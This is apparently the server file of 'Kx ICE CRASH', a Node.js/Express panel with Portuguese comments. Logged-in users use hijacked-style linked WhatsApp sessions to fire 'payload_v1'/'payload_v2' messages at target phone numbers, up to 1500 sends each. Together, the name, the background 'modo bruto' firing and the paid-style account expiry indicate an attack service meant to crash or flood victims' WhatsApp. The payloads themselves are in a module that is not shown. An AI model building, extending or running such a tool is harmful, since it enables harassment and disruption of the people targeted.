const originalStdoutWrite = process.stdout.write.bind(process.stdout);
process.stdout.write = (chunk, encoding, callback) => {
  const str = chunk.toString();
  if (
    str.includes("lastRemoteEphemeralKey") ||
    str.includes("baseKey") ||
    str.includes("rootKey") ||
    str.includes("Connection Closed") ||
    str.includes("statusCode: 428")
  ) {
    return true; 
  }
  return originalStdoutWrite(chunk, encoding, callback);
};

process.setMaxListeners(0);
process.on('uncaughtException', (err) => {
  if (err.message?.includes('Connection Closed')) return;
  console.error('\x1b[31m[CRITICAL ERROR]\x1b[0m', err);
});

import 'dotenv/config';
import path from 'path';
import express from 'express';
import session from 'express-session';
import helmet from 'helmet';
import bcrypt from 'bcryptjs';
import db from './db.js';
import { 
  normalizePhone, 
  connectNumber, 
  requestPairingCode, 
  disconnectNumber, 
  cancelPairing, 
  restoreAllSessions, 
  getSocket 
} from './whatsapp.js';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { sendPayloadType1, sendPayloadType2 } from './actions.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const app = express();
const PORT = Number(process.env.PORT || 3000);

const USER_SEND_LIMIT = 1500;
const cancelledSendJobs = new Set();

app.use(helmet({ 
  contentSecurityPolicy: false, 
  crossOriginResourcePolicy: { policy: "cross-origin" } 
}));

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

app.use(session({
  secret: process.env.SESSION_SECRET || 'kx-ice-crash-local-dev-secret',
  resave: false,
  saveUninitialized: false,
  cookie: { 
    httpOnly: true, 
    sameSite: 'lax', 
    secure: false, 
    maxAge: 8 * 60 * 60 * 1000 
  }
}));
function sanitizeJid(number) {
  if (!number) return null;
  const cleanNumber = number.toString().replace(/\D/g, '');
  if (cleanNumber.length < 10) return null; 
  return `${cleanNumber}@s.whatsapp.net`;
}

async function executeCommand(accountId, connectionId, command, target, message) {
  const sock = getSocket(accountId, connectionId);
  if (!sock) throw new Error('WhatsApp não conectado.');

  const targetJid = sanitizeJid(target);
  if (!targetJid) throw new Error('Número de destino inválido.');

  console.log(`[DeepHat] 🔥 EXECUTANDO COMANDO: ${command} -> ${targetJid}`);

  switch (command) {
    case 'payload_v1':
      return await sendPayloadType1(sock, targetJid);
    case 'payload_v2':
      return await sendPayloadType2(sock, targetJid);
    default: {
      const text = String(message || '').trim();
      return await sock.sendMessage(targetJid, { text });
    }
  }
}

app.get('/', (req, res) => res.redirect('/login.html'));
app.get('/login.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/user.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'user.html')));
app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

app.use(express.static(path.join(__dirname, 'public')));
app.use('/scripts', express.static(path.join(__dirname, 'scripts')));

app.post('/api/whatsapp/send', async (req, res) => {
  const accountId = req.session?.account?.id;
  const { target, message, command, connection_id, job_id } = req.body;

  if (!accountId) return res.status(401).json({ error: 'Não autenticado.' });

  if (job_id && cancelledSendJobs.has(job_id)) {
    return res.status(409).json({ error: 'Envio cancelado.' });
  }

    try {
    // REMOVEMOS O AWAIT: O comando é disparado em background
    executeCommand(accountId, connection_id, command, target, message)
      .then(result => console.log(`[DeepHat] ✅ Comando ${command} concluído.`))
      .catch(e => console.error(`[DeepHat] ❌ Erro no background:`, e.message));

    // Responde IMEDIATAMENTE ao site para ele disparar o próximo
    res.json({ ok: true, result: 'Disparado em modo bruto!' });
  } catch (e) {
    console.error('[SEND ERROR]', e);
    res.status(500).json({ error: e.message });
  }

});

app.get('/api/me', (req, res) => {
  if (!req.session.account) return res.status(401).json({ error: 'Não autenticado.' });
  res.json(req.session.account);
});

app.get('/api/whatsapp/numbers', (req, res) => {
  const accountId = req.session?.account?.id;
  if (!accountId) return res.status(401).json({ error: 'Não autenticado.' });
  const rows = db.prepare(`SELECT * FROM whatsapp_numbers WHERE account_id=?`).all(accountId);
  res.json(rows);
});

app.post('/api/whatsapp/connect', async (req, res) => {
  try {
    const { phone, label } = req.body;
    const result = await connectNumber({ accountId: req.session.account.id, label, phone });
    res.status(201).json(result);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});
// --- ROTAS DE ARQUIVOS ESTÁTICOS (HTML/CSS/JS) ---
app.get('/login.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/user.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'user.html')));
app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// Servir arquivos da pasta public (CSS, Imagens, JS do front)
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html') || filePath.endsWith('.txt')) {
      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
    }
  }
}));

// Servir pasta de scripts (se houver)
app.use('/scripts', express.static(path.join(__dirname, 'scripts')));

// --- ROTAS DE LOGIN / LOGOUT ---
app.post('/login', async (req, res) => {
  const { login, password } = req.body;
  const fail = (message) => res.redirect(`/login.html?error=${encodeURIComponent(message)}`);
  
  if (!login || !password) return fail('Informe login e senha.');

  const a = db.prepare('SELECT * FROM accounts WHERE login = ?').get(String(login).trim());
  if (!a) return fail('Login ou senha inválidos.');
  if (a.blocked) return fail('Conta bloqueada.');
  
  const isMatch = await bcrypt.compare(String(password), a.password_hash);
  if (!isMatch) return fail('Login ou senha inválidos.');

  req.session.account = { id: a.id, name: a.name, login: a.login, role: a.role };
  
  req.session.save((err) => {
    if (err) return res.status(500).send('Erro de sessão.');
    const target = a.role === 'user' ? '/user.html' : '/admin.html';
    return res.redirect(303, target);
  });
});

app.post('/api/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

// Rota de Configuração de Usuário
app.get('/api/user-send-config', (req, res) => {
  res.json({ interval: 4, limit: USER_SEND_LIMIT });
});
// --- ROTAS DE ADMIN (RESTRITAS) ---

// Middleware para garantir que apenas Admin/Owner acessem
function adminRequired(req, res, next) {
  if (!['owner', 'admin'].includes(req.session?.account?.role)) {
    return res.status(403).json({ error: 'Acesso restrito ao admin.' });
  }
  next();
}

// Rota de Saúde do Servidor (Health Check)
app.get('/api/health', (req, res) => res.json({ ok: true, status: 'online' }));

// Rota para carregar configurações do Painel ADM
app.get('/api/settings', adminRequired, (req, res) => {
  try {
    db.prepare(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)`).run();
    let rows = {};
    try {
      const all = db.prepare('SELECT key, value FROM settings').all();
      all.forEach(r => rows[r.key] = r.value);
    } catch (_) {}

    res.json({
      send_limit: rows.send_limit || String(USER_SEND_LIMIT),
      interval: rows.interval || '4',
      max_accounts: rows.max_accounts || '50',
      ...rows
    });
  } catch (e) {
    res.status(500).json({ error: 'Erro ao carregar configurações.' });
  }
});

// Rota para salvar configurações do Painel ADM
app.put('/api/settings', adminRequired, (req, res) => {
  try {
    db.prepare(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)`).run();
    const entries = Object.entries(req.body || {});
    const stmt = db.prepare(`INSERT INTO settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value`);
    for (const [k, v] of entries) stmt.run(String(k), String(v));
    res.json({ ok: true, saved: entries.length });
  } catch (e) {
    res.status(500).json({ error: 'Erro ao salvar configurações.' });
  }
});

// Rota para listar todas as contas (Admin apenas)
app.get('/api/accounts', adminRequired, (req, res) => {
  try {
    const rows = db.prepare(`SELECT id,name,login,role,blocked,expires_at,created_at FROM accounts ORDER BY id ASC`).all();
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: 'Erro ao listar contas.' });
  }
});
// --- TRATAMENTO DE ERROS E ENCERRAMENTO ---

// Rota de Gerenciamento de Contas (Criar, Bloquear, Deletar)
app.post('/api/accounts', adminRequired, async (req, res) => {
  try {
    const { name, login, password, role, expires_at } = req.body;
    if (!name || !login || !password) return res.status(400).json({ error: 'Informe nome, login e senha.' });

    const validRoles = ['user', 'admin', 'owner'];
    const finalRole = validRoles.includes(role) ? role : 'user';

    const exists = db.prepare('SELECT id FROM accounts WHERE login=?').get(String(login).trim());
    if (exists) return res.status(409).json({ error: 'Este login já está em uso.' });

    const hash = await bcrypt.hash(String(password), 10);
    const result = db.prepare(`
      INSERT INTO accounts(name, login, password_hash, role, blocked, expires_at)
      VALUES(?,?,?,?,0,?)
    `).run(String(name).trim(), String(login).trim(), hash, finalRole, expires_at || null);

    res.status(201).json({ ok: true, id: Number(result.lastInsertRowid) });
  } catch (e) {
    console.error('[CREATE ACCOUNT ERROR]', e);
    res.status(500).json({ error: 'Erro ao criar conta.' });
  }
});

// Rota para Bloquear/Desbloquear (Admin apenas)
app.put('/api/accounts/:id/block', adminRequired, (req, res) => {
  try {
    const id = Number(req.params.id);
    const { blocked } = req.body;
    db.prepare('UPDATE accounts SET blocked=? WHERE id=?').run(blocked ? 1 : 0, id);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Erro ao atualizar conta.' });
  }
});

// Rota para Deletar Conta (Admin apenas)
app.delete('/api/accounts/:id', adminRequired, (req, res) => {
  try {
    const id = Number(req.params.id);
    if (id === req.session.account.id) return res.status(400).json({ error: 'Você não pode excluir sua própria conta.' });
    db.prepare('DELETE FROM accounts WHERE id=?').run(id);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Erro ao excluir conta.' });
  }
});

// Rota de Logout do Usuário
app.post('/api/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});
// --- INICIALIZAÇÃO DO SERVIDOR ---

const startServer = async () => {
  app.listen(PORT, '0.0.0.0', async () => {
    console.log(`\n=========================================`);
    console.log(`🚀 SERVIDOR Kx ICE CRASH ONLINE`);
    console.log(`🔗 URL: http://localhost:${PORT}`);
    console.log(`=========================================\n`);

    try {
      // Restaura as sessões do WhatsApp ao ligar
      await restoreAllSessions();
      console.log('✅ [DB] Sessões restauradas.');
    } catch (e) {
      console.error('❌ [DB] Erro ao restaurar sessões:', e.message);
    }
  });
};

// Inicia o servidor
startServer();

// --- TRATAMENTO DE ENCERRAMENTO SEGURO ---

process.on('SIGINT', () => {
  console.log('\n[SERVER] Desligando servidor de forma segura...');
  cancelledSendJobs.clear();
  process.exit(0);
});

// Monitoramento de Memória (Evita crash por falta de RAM)
setInterval(() => {
  const usado = process.memoryUsage().rss / 1024 / 1024;
  if (usado > 500) { // Se passar de 500MB, reinicia para limpar
    console.log(`\n[MONITOR] Memória alta (${Math.round(usado)}MB). Reiniciando...`);
    process.exit(1);
  }
}, 60000);
// --- TRATAMENTO DE ERROS GLOBAIS (PREVENÇÃO DE QUEDA) ---

// Captura erros de promessas não tratadas (essencial para manter o servidor vivo)
process.on('unhandledRejection', (reason) => {
  console.error('\x1b[33m[UNHANDLED REJECTION]\x1b[0m', reason);
});

// Captura exceções não tratadas que poderiam derrubar o processo
process.on('uncaughtException', (err) => {
  console.error('\x1b[31m[UNCAUGHT EXCEPTION]\x1b[0m', err);
  // Não mata o processo imediatamente para dar chance de recuperação
  // mas loga o erro para você saber o que aconteceu.
});

// --- FIM DO ARQUIVO SERVER.JS ---
// ========================================================
// CONFIGURAÇÃO FINALIZADA COM SUCESSO POR DEEPHAT
// ========================================================